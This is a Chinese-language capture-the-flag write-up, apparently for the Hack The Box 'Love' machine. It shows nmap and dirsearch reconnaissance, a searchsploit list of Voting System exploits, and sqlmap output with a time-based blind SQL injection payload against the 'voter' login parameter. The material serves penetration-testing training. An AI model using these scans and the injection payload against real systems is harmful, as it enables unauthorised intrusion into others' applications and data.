# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

开放端口探测
```
┌──(root💀kali)-[~/htb/Love]
└─# nmap -p- 10.10.10.239 --open                                                                                                                       130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 08:49 EST
Nmap scan report for 10.10.10.239
Host is up (0.38s latency).
Not shown: 64817 closed tcp ports (reset), 699 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 188.90 seconds

```

端口详细信息
```
┌──(root💀kali)-[~/htb/Love]
└─# nmap -sV -Pn -AO 10.10.10.239 -P 80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 08:54 EST
Failed to resolve "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670".
Failed to resolve "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670".
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.239
Host is up (0.40s latency).                                                                                                                                  
Not shown: 992 closed tcp ports (reset)                                                                                                                      
PORT     STATE    SERVICE      VERSION
80/tcp   open     http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open     ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
445/tcp  open     microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
1099/tcp filtered rmiregistry
3306/tcp open     mysql?
| fingerprint-strings: 
|   FourOhFourRequest, NULL, NotesRPC: 
|_    Host '10.10.14.5' is not allowed to connect to this MariaDB server
5000/tcp open     http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=1/10%Time=61DC3ADA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourReq
SF:uest,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,49
SF:,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.5'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server");
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (96%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Server 2008 SP2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8.1 Update 1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h01m34s, deviation: 4h37m10s, median: 21m32s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-10T14:17:58
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-10T06:17:59-08:00

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   403.34 ms 10.10.14.1
2   403.58 ms 10.10.10.239

Failed to resolve "80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670".
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 147.82 seconds

```


# web
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.239                                 

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                      
                                                                                                                                                             
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.239/_22-01-10_08-39-35.txt

Error Log: /root/dirsearch/logs/errors-22-01-10_08-39-35.log

Target: http://10.10.10.239/

[08:39:38] Starting:                                  
[08:40:04] 301 -  337B  - /ADMIN  ->  http://10.10.10.239/ADMIN/            
[08:40:04] 301 -  337B  - /Admin  ->  http://10.10.10.239/Admin/                                     
[08:40:14] 301 -  337B  - /admin  ->  http://10.10.10.239/admin/            
[08:40:14] 301 -  338B  - /admin.  ->  http://10.10.10.239/admin./          
[08:40:15] 200 -    6KB - /admin/                                           
[08:40:15] 403 -  302B  - /admin/.htaccess                                  
[08:40:15] 200 -    6KB - /admin%20/                                        
[08:40:16] 302 -    0B  - /admin/login.php  ->  index.php                   
[08:40:16] 200 -    6KB - /admin/?/login                                    
[08:40:17] 200 -    6KB - /admin/index.php                                  
[08:40:17] 302 -   16KB - /admin/home.php  ->  index.php                    
[08:40:37] 301 -  348B  - /bower_components  ->  http://10.10.10.239/bower_components/
[08:40:39] 200 -    7KB - /bower_components/                                                                      
[08:40:48] 200 -    1KB - /dist/                                            
[08:40:48] 301 -  336B  - /dist  ->  http://10.10.10.239/dist/                                 
[08:40:57] 302 -    0B  - /home.php  ->  index.php                          
[08:40:58] 301 -  338B  - /images  ->  http://10.10.10.239/images/          
[08:40:58] 200 -    2KB - /images/                                          
[08:40:58] 503 -  402B  - /examples/                                        
[08:40:59] 200 -    4KB - /index.php                                                                     
[08:41:00] 200 -    4KB - /index.pHp                                        
[08:41:01] 200 -    4KB - /index.php/login/                                 
[08:41:01] 200 -    4KB - /index.php.                                       
[08:41:01] 200 -    2KB - /includes/
[08:41:01] 301 -  340B  - /includes  ->  http://10.10.10.239/includes/
[08:41:05] 302 -    0B  - /login.php  ->  index.php                         
[08:41:06] 302 -    0B  - /logout.php  ->  index.php                                            
[08:41:20] 301 -  339B  - /plugins  ->  http://10.10.10.239/plugins/        
[08:41:20] 200 -    2KB - /plugins/                                         
```

80端口是一个叫voting system的web app，kali搜索这个程序的漏洞情况
```
┌──(root💀kali)-[~/dirsearch]
└─# searchsploit voting system                                                                                                                           6 ⨯
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                                                               | php/webapps/43967.py
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                                    | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                                           | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                                      | php/webapps/50088.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                                           | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                                                           | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                  | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI (Unauthenticated SQL injection)                                                        | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL Injection                  | php/webapps/50052.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


```
┌──(root💀kali)-[~/htb/Love]
└─# sqlmap -r data --batch -p voter --level 5 --risk 3 
        ___
       __H__                                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.5.12#stable}                                                                                                                    
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:33:05 /2022-01-10/

[09:33:05] [INFO] parsing HTTP request from 'data'
[09:33:05] [INFO] resuming back-end DBMS 'mysql' 
[09:33:05] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.10.10.239:80/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: voter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: voter=admin' AND (SELECT 4771 FROM (SELECT(SLEEP(5)))YdaT) AND 'Vvvd'='Vvvd&password=123&login=asd
---
[09:33:08] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.27, Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:33:08] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.10.239'

[*] ending @ 09:33:08 /2022-01-10/

```

证实用户名voter字段存在基于时间的sql注入